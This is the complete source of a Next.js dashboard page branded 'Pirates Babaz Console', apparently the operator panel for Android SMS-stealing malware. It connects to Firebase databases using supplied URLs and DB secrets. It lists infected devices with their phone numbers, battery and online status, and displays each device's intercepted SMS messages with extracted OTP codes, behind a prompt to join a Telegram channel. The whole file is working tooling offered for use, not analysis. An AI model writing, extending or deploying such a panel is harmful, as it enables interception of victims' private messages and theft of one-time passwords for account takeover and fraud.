"use client";
import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";

const LS_ACCOUNTS = "ab_accounts";
const LS_ACTIVE = "ab_active";
const LS_JOINED = "ab_tg_joined";
const CHANNEL_LINK = "https://t.me/piratesbabaz";
const CHANNEL_NAME = "@piratesbabaz";

function uid() {
  return Math.random().toString(36).slice(2, 10);
}

export default function Dashboard() {
  const router = useRouter();
  const [accounts, setAccounts] = useState([]);
  const [activeId, setActiveId] = useState("");
  const [devices, setDevices] = useState([]);
  const [loading, setLoading] = useState(false);
  const [smsLoading, setSmsLoading] = useState(false);
  const [err, setErr] = useState("");
  const [q, setQ] = useState("");
  const [tab, setTab] = useState("all"); // all|online|offline
  const [showAdd, setShowAdd] = useState(false);
  const [newUrl, setNewUrl] = useState("");
  const [newAuth, setNewAuth] = useState("");
  const [newLabel, setNewLabel] = useState("");
  const [smsOpen, setSmsOpen] = useState(null);
  const [messages, setMessages] = useState([]);
  const [smsFilter, setSmsFilter] = useState("");
  const [showJoin, setShowJoin] = useState(false);

  const active = accounts.find((a) => a.id === activeId) || null;

  useEffect(() => {
    try {
      const acc = JSON.parse(localStorage.getItem(LS_ACCOUNTS) || "[]");
      setAccounts(acc);
      const act = localStorage.getItem(LS_ACTIVE) || (acc[0] && acc[0].id) || "";
      setActiveId(act);
      if (localStorage.getItem(LS_JOINED) !== "1") setShowJoin(true);
    } catch {
      if (localStorage.getItem(LS_JOINED) !== "1") setShowJoin(true);
    }
  }, []);

  useEffect(() => {
    if (active) loadDevices();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [activeId]);

  async function api(payload) {
    const r = await fetch("/api/fb", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    return r.json();
  }

  async function loadDevices() {
    if (!active) return;
    setLoading(true);
    setErr("");
    try {
      const data = await api({ action: "devices", url: active.url, auth: active.auth || "" });
      if (!data.ok) throw new Error(data.error || "Failed");
      setDevices(data.devices || []);
    } catch (e) {
      setErr(String(e.message || e));
      setDevices([]);
    } finally {
      setLoading(false);
    }
  }

  function saveAccounts(next) {
    setAccounts(next);
    localStorage.setItem(LS_ACCOUNTS, JSON.stringify(next));
  }

  async function addAccount() {
    if (!newUrl.trim()) return;
    setLoading(true);
    setErr("");
    try {
      const ping = await api({ action: "ping", url: newUrl.trim(), auth: newAuth.trim() });
      if (!ping.ok && ping.status !== 200) {
        // still allow save; private db may need auth path differences
      }
      const item = {
        id: uid(),
        url: newUrl.trim(),
        auth: newAuth.trim(),
        label: newLabel.trim() || newUrl.trim(),
        addedAt: new Date().toISOString(),
      };
      const next = [item, ...accounts];
      saveAccounts(next);
      setActiveId(item.id);
      localStorage.setItem(LS_ACTIVE, item.id);
      setShowAdd(false);
      setNewUrl("");
      setNewAuth("");
      setNewLabel("");
    } catch (e) {
      setErr(String(e.message || e));
    } finally {
      setLoading(false);
    }
  }

  function removeAccount(id) {
    const next = accounts.filter((a) => a.id !== id);
    saveAccounts(next);
    if (activeId === id) {
      const nid = next[0]?.id || "";
      setActiveId(nid);
      localStorage.setItem(LS_ACTIVE, nid);
      setDevices([]);
    }
  }

  function logout() {
    // password system removed — just reload dashboard
    window.location.href = "/dashboard";
  }

  async function openSms(device) {
    if (!active) return;
    setSmsOpen(device);
    setMessages([]);
    setSmsLoading(true);
    try {
      const data = await api({
        action: "sms",
        url: active.url,
        auth: active.auth || "",
        deviceId: device.id,
      });
      setMessages(data.messages || []);
    } catch (e) {
      setMessages([]);
    } finally {
      setSmsLoading(false);
    }
  }

  const filtered = useMemo(() => {
    let list = devices;
    if (tab === "online") list = list.filter((d) => d.online);
    if (tab === "offline") list = list.filter((d) => !d.online);
    if (q.trim()) {
      const s = q.trim().toLowerCase();
      list = list.filter(
        (d) =>
          d.id.toLowerCase().includes(s) ||
          (d.phone || "").includes(s) ||
          (d.name || "").toLowerCase().includes(s)
      );
    }
    return list;
  }, [devices, tab, q]);

  const online = devices.filter((d) => d.online).length;
  const offline = devices.length - online;

  const smsFiltered = useMemo(() => {
    if (!smsFilter.trim()) return messages;
    const s = smsFilter.toLowerCase();
    return messages.filter(
      (m) =>
        (m.body || "").toLowerCase().includes(s) ||
        (m.sender || "").toLowerCase().includes(s) ||
        (m.otp || "").includes(s)
    );
  }, [messages, smsFilter]);

  return (
    <div className="container">
      <div className="topbar">
        <div className="brand">
          <div className="logo">PB</div>
          <div>
            <div>PIRATES BABAZ</div>
            <div style={{ color: "var(--muted)", fontSize: 12, letterSpacing: 0 }}>Pirates Babaz Console</div>
          </div>
        </div>
        <div style={{ display: "flex", gap: 8, alignItems: "center", flexWrap: "wrap" }}>
          <span className="pill ok">● Connected</span>
          <select
            value={activeId}
            onChange={(e) => {
              setActiveId(e.target.value);
              localStorage.setItem(LS_ACTIVE, e.target.value);
            }}
            style={{ background: "#0b1220", color: "white", border: "1px solid var(--line)", borderRadius: 10, padding: "8px 10px" }}
          >
            <option value="">Select account</option>
            {accounts.map((a) => (
              <option key={a.id} value={a.id}>
                {a.label || a.url}
              </option>
            ))}
          </select>
          <button className="btn" onClick={() => setShowAdd(true)}>+ New Account</button>
          <button className="btn" onClick={loadDevices}>Refresh</button>
          <button className="btn ghost" onClick={logout}>Logout</button>
        </div>
      </div>

      <div className="stats">
        <div className="stat"><div className="k">TOTAL</div><div className="v">{devices.length}</div></div>
        <div className="stat"><div className="k">ONLINE</div><div className="v" style={{ color: "#86efac" }}>{online}</div></div>
        <div className="stat"><div className="k">OFFLINE</div><div className="v">{offline}</div></div>
        <div className="stat"><div className="k">ACCOUNTS</div><div className="v">{accounts.length}</div></div>
      </div>

      <div className="toolbar">
        <input placeholder="Search devices..." value={q} onChange={(e) => setQ(e.target.value)} />
        <div className="tabs">
          {["all", "online", "offline"].map((t) => (
            <div key={t} className={`tab ${tab === t ? "active" : ""}`} onClick={() => setTab(t)}>
              {t[0].toUpperCase() + t.slice(1)}
            </div>
          ))}
        </div>
      </div>

      {err && <div className="err">{err}</div>}
      {loading && <div className="empty">Loading devices...</div>}

      {!loading && !active && <div className="empty">Add a Firebase URL to start</div>}

      {!loading && active && filtered.length === 0 && <div className="empty">No devices found for this filter</div>}

      <div className="grid">
        {filtered.map((d) => (
          <div className="card" key={d.id} onClick={() => openSms(d)} style={{ cursor: "pointer" }}>
            <div className="head">
              <div>
                <div className="id">{d.name || d.id}</div>
                <div className="sub">{d.id}</div>
              </div>
              <button className="btn" onClick={(e) => { e.stopPropagation(); openSms(d); }}>SMS</button>
            </div>
            <div className="meta">
              <div>
                <div className="label">ANDROID</div>
                <div className="val">{d.android || "—"}</div>
              </div>
              <div>
                <div className="label">BATTERY</div>
                <div className="val battery" style={{ color: d.battery == null ? "var(--muted)" : d.battery < 20 ? "#fca5a5" : d.battery < 50 ? "#fde68a" : "#86efac" }}>
                  {d.battery == null ? "—" : `${d.battery}%`}
                </div>
              </div>
              <div>
                <div className="label">NUMBER</div>
                <div className="val">{d.phone || "—"}</div>
              </div>
              <div>
                <div className="label">STATUS</div>
                <div className="status">
                  <span className={`dot ${d.online ? "on" : "off"}`} />
                  {d.online ? "Online" : "Offline"}
                </div>
              </div>
            </div>
          </div>
        ))}
      </div>

      {showAdd && (
        <div className="modal-bg" onClick={() => setShowAdd(false)}>
          <div className="modal" onClick={(e) => e.stopPropagation()}>
            <h3 style={{ marginTop: 0 }}>New Firebase Account</h3>
            <input
              style={{ width: "100%", marginBottom: 8, padding: 10, borderRadius: 10, border: "1px solid var(--line)", background: "#0b1220", color: "white" }}
              placeholder="https://xxx-default-rtdb.firebaseio.com"
              value={newUrl}
              onChange={(e) => setNewUrl(e.target.value)}
            />
            <input
              style={{ width: "100%", marginBottom: 8, padding: 10, borderRadius: 10, border: "1px solid var(--line)", background: "#0b1220", color: "white" }}
              placeholder="Label (optional)"
              value={newLabel}
              onChange={(e) => setNewLabel(e.target.value)}
            />
            <input
              style={{ width: "100%", marginBottom: 8, padding: 10, borderRadius: 10, border: "1px solid var(--line)", background: "#0b1220", color: "white" }}
              placeholder="Auth token / DB secret (if private)"
              value={newAuth}
              onChange={(e) => setNewAuth(e.target.value)}
            />
            <div style={{ display: "flex", gap: 8, justifyContent: "flex-end" }}>
              <button className="btn ghost" onClick={() => setShowAdd(false)}>Cancel</button>
              <button className="btn primary" onClick={addAccount}>Connect</button>
            </div>
            <div style={{ marginTop: 14 }}>
              <div style={{ color: "var(--muted)", fontSize: 12, marginBottom: 8 }}>Saved accounts</div>
              {accounts.map((a) => (
                <div className="account" key={a.id} style={{ marginBottom: 8 }}>
                  <div className="u">{a.url}</div>
                  <button className="btn danger" onClick={() => removeAccount(a.id)}>Delete</button>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {smsOpen && (
        <div className="modal-bg" onClick={() => setSmsOpen(null)}>
          <div className="modal" onClick={(e) => e.stopPropagation()}>
            <div style={{ display: "flex", justifyContent: "space-between", gap: 8 }}>
              <div>
                <h3 style={{ margin: 0 }}>SMS / OTP · {smsOpen.phone || smsOpen.id}</h3>
                <div style={{ color: "var(--muted)", fontSize: 12 }}>{smsOpen.id}</div>
              </div>
              <button className="btn ghost" onClick={() => setSmsOpen(null)}>Close</button>
            </div>
            <input
              style={{ width: "100%", margin: "12px 0", padding: 10, borderRadius: 10, border: "1px solid var(--line)", background: "#0b1220", color: "white" }}
              placeholder="Filter SMS / OTP..."
              value={smsFilter}
              onChange={(e) => setSmsFilter(e.target.value)}
            />
            {smsLoading && <div className="empty">Loading SMS...</div>}
            {!smsLoading && smsFiltered.length === 0 && <div className="empty">Is device pe SMS nahi mili.\nPath check / device offline ho sakta hai.</div>}
            {smsFiltered.map((m) => (
              <div className="sms-row" key={m.key}>
                <div className="s">{m.sender || "Unknown"} · {m.ts || m.key}</div>
                <div>{m.body}</div>
                {m.otp && <div className="otp">OTP: {m.otp}</div>}
              </div>
            ))}
          </div>
        </div>
      )}
      {showJoin && (
        <div className="modal-bg">
          <div className="modal" style={{ maxWidth: 420, textAlign: "center" }}>
            <div className="brand" style={{ justifyContent: "center", marginBottom: 8 }}>
              <div className="logo">PB</div>
            </div>
            <h3 style={{ margin: "8px 0" }}>Join Telegram Channel</h3>
            <p style={{ color: "var(--muted)", marginTop: 0 }}>
              Panel use karne se pehle channel join karo:
              <br />
              <b>{CHANNEL_NAME}</b>
            </p>
            <a className="btn primary" style={{ display: "inline-block", marginBottom: 10 }} href={CHANNEL_LINK} target="_blank" rel="noreferrer">
              Join {CHANNEL_NAME}
            </a>
            <div>
              <button
                className="btn"
                onClick={() => {
                  localStorage.setItem(LS_JOINED, "1");
                  setShowJoin(false);
                }}
              >
                I Joined — Continue
              </button>
            </div>
          </div>
        </div>
      )}

    </div>
  );
}
